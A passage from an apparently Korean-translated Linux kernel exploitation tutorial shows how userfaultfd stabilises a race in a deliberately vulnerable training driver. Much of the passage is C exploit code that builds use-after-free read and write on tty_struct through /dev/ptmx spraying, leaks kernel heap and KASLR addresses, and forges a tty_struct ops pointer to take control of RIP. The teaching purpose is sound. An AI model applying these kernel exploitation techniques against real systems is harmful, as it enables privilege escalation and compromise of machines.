class="type">void</span>*)uffd))</span><br><span class="line">    fatal(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">void</span> *page;</span><br><span class="line">  page = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (page == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  register_uffd(page, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 스레드 내부 puts와 futex 때문에 주의 */</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x0000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page + <span class="number">0x1000</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x1000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x0000: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, (<span class="type">char</span>*)(page + <span class="number">0x1000</span>));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;0x1000: %s\n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>이 코드에서는 <code>register_uffd</code>에 페이지 주소와 userfaultfd로 감시할 길이를 넘깁니다. <code>register_uffd</code>는 페이지 폴트를 처리하는 스레드 <code>fault_handler_thread</code>를 만듭니다.<br>
+페이지 폴트가 발생하면 <code>fault_handler_thread</code> 안의 <code>read</code>가 이벤트를 받아 오고, 그 시점에 어떤 데이터를 반환할지 정합니다. 위 예제에서는 폴트 횟수에 따라 다른 문자열을 반환합니다.</p>
+<p><code>main</code>에서는 두 페이지를 할당<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>하고, 그 영역에 <code>userfaultfd</code>를 설정합니다. 처음 두 번의 <code>strcpy</code>는 첫 접근이므로 페이지 폴트를 일으켜 핸들러가 실행됩니다. 아래처럼 첫 두 번에서 핸들러가 불리고, 핸들러가 돌려준 데이터가 반영되면 성공입니다.</p>
+<center>
+  <img src="img/uffd_sample.png" alt="userfaultfd 사용 예시" style="width:480px;">
+</center>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_normal.png" alt="늑대" ></div>
+  <p class="says">
+    userfaultfd 핸들러는 별도 스레드로 동작하니까, 메인 스레드와 다른 CPU에서 실행될 수 있어.
+    핸들러 안에서 객체를 할당할 때 CPU별 힙 캐시가 달라지면 UAF가 실패할 수 있으니 <code>sched_setaffinity</code>로 CPU를 고정해야 해.
+  </p>
+</div>
+<h2 id="Race-안정화">Race 안정화</h2>
+<p>이제 실제 exploit에 <code>userfaultfd</code>를 이용해 봅시다.<br>
+<code>userfaultfd</code>를 사용하면 페이지 폴트 타이밍에 커널 공간(드라이버 코드)의 실행을 멈추고 사용자 공간으로 컨텍스트를 되돌릴 수 있습니다. 페이지 폴트는 등록한 사용자 페이지를 처음 읽거나 쓸 때 발생하므로, 이 드라이버에서는 <code>copy_from_user</code>나 <code>copy_to_user</code> 지점에서 처리를 멈출 수 있습니다. 즉 다음 위치에서 정지할 수 있습니다.</p>
+<ul>
+<li><code>blob_add</code>의 <code>copy_from_user</code></li>
+<li><code>blob_get</code>의 <code>copy_to_user</code></li>
+<li><code>blob_set</code>의 <code>copy_from_user</code></li>
+</ul>
+<p>우리가 원하는 것은 Use-after-Free이므로, 위 함수들 중 하나에서 처리를 멈춘 사이에 <code>blob_del</code>을 호출하면 됩니다. <code>blob_get</code> 중에 삭제하면 UAF Read가, <code>blob_set</code> 중에 삭제하면 UAF Write가 만들어집니다. <code>tty_struct</code>를 대상으로 읽기/쓰기를 시도해 봅시다.<br>
+전체 흐름은 다음과 같습니다.</p>
+<center>
+  <img src="img/uffd_uafr.png" alt="userfaultfd를 이용한 Use-after-Free" style="width:720px;">
+</center>
+<p><code>tty_struct</code>와 같은 크기대(<code>kmalloc-1024</code>)에서 할당한 버퍼 <code>victim</code>에 대해 <code>blob_get</code>을 호출합니다. 이때 <code>userfaultfd</code>를 설정한 주소를 넘기면, <code>blob_get</code> 내부의 <code>copy_to_user</code>에서 페이지 폴트가 발생하고 핸들러가 실행됩니다. 락이 없기 때문에 핸들러 안에서 <code>blob_del</code>을 호출할 수 있고, 그 결과 <code>victim</code>이 해제됩니다.<br>
+그다음 <code>tty_struct</code>를 spray하면 방금 해제한 <code>victim</code> 슬롯에 TTY 객체가 올라옵니다. 이후 핸들러가 복귀하면 <code>copy_to_user</code>는 여전히 원래 <code>victim</code> 주소에서 데이터를 읽어 복사하므로, 실제로는 <code>tty_struct</code> 내용이 사용자 공간으로 누출됩니다.<br>
+같은 원리로 <code>blob_set</code>을 이용하면 UAF Write도 만들 수 있습니다. 코드를 써서 확인해 봅시다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">cpu_set_t</span> pwn_cpu;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> victim;</span><br><span class="line"><span class="type">char</span> *buf;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>* <span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">  <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">copy</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">  <span class="type">long</span> uffd;</span><br><span class="line">  <span class="type">static</span> <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 메인 스레드와 같은 CPU에서 동작 */</span></span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>), &amp;pwn_cpu))</span><br><span class="line">    fatal(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line"></span><br><span class="line">  uffd = (<span class="type">long</span>)arg;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] fault_handler_thread: waiting for page fault...&quot;</span>);</span><br><span class="line">  pollfd.fd = uffd;</span><br><span class="line">  pollfd.events = POLLIN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pollfd.revents &amp; POLLERR || pollfd.revents &amp; POLLHUP)</span><br><span class="line">      fatal(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 페이지 폴트 대기 */</span></span><br><span class="line">    <span class="keyword">if</span> (read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg)) &lt;= <span class="number">0</span>) fatal(<span class="string">&quot;read(uffd)&quot;</span>);</span><br><span class="line">    assert (msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 요청된 페이지에 대해 돌려줄 데이터 설정 */</span></span><br><span class="line">    <span class="keyword">switch</span> (fault_cnt++) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] UAF read&quot;</span>);</span><br><span class="line">        <span class="comment">/* [1-2] `blob_get`에 의한 페이지 폴트 */</span></span><br><span class="line">        <span class="comment">// victim 해제</span></span><br><span class="line">        del(victim);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tty_struct를 spray해서 victim 위에 덮기</span></span><br><span class="line">        <span class="type">int</span> fds[<span class="number">0x10</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">          fds[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">          <span class="keyword">if</span> (fds[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy_to_user로 덮일 것이므로 내용은 적당해도 됨</span></span><br><span class="line">        copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)buf;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">/* [2-2] `blob_set`에 의한 페이지 폴트 */</span></span><br><span class="line">        <span class="comment">// victim 해제</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address;</span><br><span class="line">    copy.len = <span class="number">0x1000</span>;</span><br><span class="line">    copy.mode = <span class="number">0</span>;</span><br><span class="line">    copy.copy = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;copy) == <span class="number">-1</span>) fatal(<span class="string">&quot;ioctl(UFFDIO_COPY)&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">/* 메인 스레드와 핸들러가 반드시 같은 CPU에서 실행되게 함 */</span></span><br><span class="line">  CPU_ZERO(&amp;pwn_cpu);</span><br><span class="line">  CPU_SET(<span class="number">0</span>, &amp;pwn_cpu);</span><br><span class="line">  <span class="keyword">if</span> (sched_setaffinity(<span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="type">cpu_set_t</span>), &amp;pwn_cpu))</span><br><span class="line">    fatal(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">    </span><br><span class="line">  fd = open(<span class="string">&quot;/dev/fleckvieh&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/fleckvieh&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *page;</span><br><span class="line">  page = mmap(<span class="literal">NULL</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE,</span><br><span class="line">              MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (page == MAP_FAILED) fatal(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">  register_uffd(page, <span class="number">0x2000</span>);</span><br><span class="line"></span><br><span class="line">  buf = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">set</span>(victim, <span class="string">&quot;Hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* [1-1] UAF Read: tty_struct 누출 */</span></span><br><span class="line">  get(victim, page, <span class="number">0x400</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x: 0x%016lx\n&quot;</span>, i, *(<span class="type">unsigned</span> <span class="type">long</span>*)(page + i));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>코드는 길지만, 앞서 그림에서 설명한 내용을 그대로 구현한 것입니다. 이 방식으로 거의 100% 확률로 Use-after-Free를 만들 수 있다는 것을 확인할 수 있습니다.</p>
+<center>
+  <img src="img/test_uaf.png" alt="Use-after-Free 동작 확인" style="width:480px;">
+</center>
+<p>위 그림의 누출 데이터를 보면 <code>tty_struct</code> 앞부분이 제대로 복사되지 않았다는 것을 눈치챌 수 있습니다. (<code>tty_operations</code> 등이 있어야 하는데 처음 <code>0x30</code>바이트 정도가 모두 0입니다.)<br>
+이것은 <code>copy_to_user</code>를 큰 크기로 호출했기 때문입니다. <code>copy_to_user</code>는 <code>victim</code>의 시작부터 데이터를 복사하려고 하고, 목적지 페이지에 실제로 쓰려는 순간에야 페이지 폴트가 발생합니다. 그래서 앞부분 바이트는 UAF가 발생하기 전 상태의 데이터가 복사됩니다.<br>
+다행히 <code>copy_to_user</code>는 전체 크기에 따라 내부 루프에서 한 번에 다루는 크기가 달라집니다. 따라서 예를 들어 <code>0x20</code> 같은 작은 크기로 <code>copy_to_user</code>를 호출하면, 처음 <code>0x10</code>바이트만 UAF 이전 데이터가 되고, 나머지 <code>0x10</code>바이트는 <code>tty_operations</code> 포인터를 포함해 UAF 이후 데이터가 됩니다.</p>
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="늑대" ></div>
+  <p class="says">
+   어셈블리 수준에서 정확히 언제 페이지 폴트가 나는지 모르면 디버깅이 꽤 힘들겠네.
+  </p>
+</div>
+<p>KASLR과 힙 주소를 누출할 수 있게 되면, 같은 방식으로 UAF Write도 만들 수 있습니다.<br>
+이번에도 익숙하게 가짜 <code>tty_struct</code>의 <code>ops</code>를 가짜 함수 테이블로 향하게 만들 것이지만, 이번에 UAF가 일어나는 주소가 앞서 누출한 주소와 다를 수 있다는 점에 주의해야 합니다. 누출한 힙 주소는 <code>close</code>로 해제한 <code>tty_struct</code>의 위치에 해당하므로, 먼저 그 위치에 가짜 <code>tty_operation</code>을 spray하도록 합시다. (이번에는 <code>tty_operation</code>과 <code>tty_struct</code>를 같은 0x400 청크로 겸용합니다.)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">case</span> <span class="number">2</span>: &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] UAF write&quot;</span>);</span><br><span class="line">        <span class="comment">/* [3-2] `blob_set`에 의한 페이지 폴트 */</span></span><br><span class="line">        <span class="comment">// 누출한 kheap 위치에 가짜 tty_operation spray</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++) &#123;</span><br><span class="line">          add(buf, <span class="number">0x400</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* [2-1] UAF Read: tty_struct 누출 (heap) */</span></span><br><span class="line">  victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line">  get(victim, page+<span class="number">0x1000</span>, <span class="number">0x400</span>);</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> kheap = *(<span class="type">unsigned</span> <span class="type">long</span>*)(page + <span class="number">0x1038</span>) - <span class="number">0x38</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;kheap = 0x%016lx\n&quot;</span>, kheap);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) close(ptmx[i]);</span><br></pre></td></tr></table></figure>
+<p>누출한 주소에 가짜 함수 테이블을 준비했다면, 앞의 UAF Read와 같은 방식으로 다시 UAF를 발생시킵니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// victim 해제 후 tty_struct spray</span></span><br><span class="line">del(victim);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">  ptmx[i] = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY | O_NOCTTY);</span><br><span class="line">  <span class="keyword">if</span> (ptmx[i] == <span class="number">-1</span>) fatal(<span class="string">&quot;/dev/ptmx&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy_from_user로 써 넣을 데이터가 담긴 버퍼</span></span><br><span class="line">copy.src = (<span class="type">unsigned</span> <span class="type">long</span>)buf;</span><br></pre></td></tr></table></figure>
+<p>이번에는 UAF Write이므로, 실제로 써 넣을 데이터를 제어해야 합니다. 그 데이터는 <code>copy.src</code>에서 오므로, 미리 가짜 <code>tty_struct</code>를 만들어 두면 됩니다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* [3-1] UAF Write: tty_struct 덮어쓰기 */</span></span><br><span class="line"><span class="built_in">memcpy</span>(buf, page+<span class="number">0x1000</span>, <span class="number">0x400</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> *tty = (<span class="type">unsigned</span> <span class="type">long</span>*)buf;</span><br><span class="line">tty[<span class="number">0</span>] = <span class="number">0x0000000100005401</span>; <span class="comment">// magic</span></span><br><span class="line">tty[<span class="number">2</span>] = *(<span class="type">unsigned</span> <span class="type">long</span>*)(page + <span class="number">0x10</span>); <span class="comment">// dev</span></span><br><span class="line">tty[<span class="number">3</span>] = kheap; <span class="comment">// ops</span></span><br><span class="line">tty[<span class="number">12</span>] = <span class="number">0xdeadbeef</span>; <span class="comment">// ops-&gt;ioctl</span></span><br><span class="line">victim = add(buf, <span class="number">0x400</span>);</span><br><span class="line"><span class="built_in">set</span>(victim, page+<span class="number">0x2000</span>, <span class="number">0x400</span>);</span><br></pre></td></tr></table></figure>
+<p>RIP가 제어되면 핵심은 끝난 것입니다. 이후 권한 상승 단계는 각자 완성해 보세요.</p>
+<center>
+  <img src="img/fleck_privesc.png" alt="Fleckvieh 권한 상승" style="width:480px;">
+</center>
+<p>샘플 익스플로잇 코드는 <a href="exploit/fleckvieh_uffd.c">여기</a>에서 다운로드할 수 있습니다.</p>
+<hr>
+<div class="column" title="예제">
+  이번에는 Race를 안정화하는 목적으로만 userfaultfd를 사용했습니다.
+  하지만 데이터를 페이지 경계에 걸쳐 배치하면, 구조체의 특정 멤버를 읽거나 쓰는 시점에서 정확히 처리를 멈출 수도 있습니다.
+  이런 기법이 exploit에 유용할 수 있는 상황을 생각해 봅시다.
+</div>
+<hr class="footnotes-sep">
+<section class="footnotes">
+<ol class="footnotes-list">
+<li id="fn1" class="footnote-item"><p>첫 접근에서 페이지 폴트를 일으키고 싶기 때문에 <code>MAP_POPULATE</code>는 쓰지 않습니다. <a href="#fnref1" class="footnote-backref">↩︎</a></p>
+</li>
+</ol>
+</section>
+
+</div> 
+
+<div style="margin-top: 1em">
+    <div class="h-line-primary"></div>
+    
+        <div class="pagination">
+            <div class="pagination-bk"><a href="../LK03/double_fetch.html">前のページへ</a></div>
+            <div class="pagination-index"><a href="../index.html">目次へ</a></div>
+            <div class="pagination-fd"><a href="fuse.html">次のページへ</a></div>
+        </div>
+    
+</div>
+
+<script>
+    window.onload = detectors();
+</script>
+
+  
+</article>
+        </div>
+      </div>
+      
+      <div class="footer">
+    <div class="flex-container">
+        <div class="footer-text">
+            
+                © 2023 ptr-yudai 🐈
+                <br>
+            
+            
+                
+        </div>
+    </div>
+</div>
+
+    </div>
+
+  </body>
+</html>
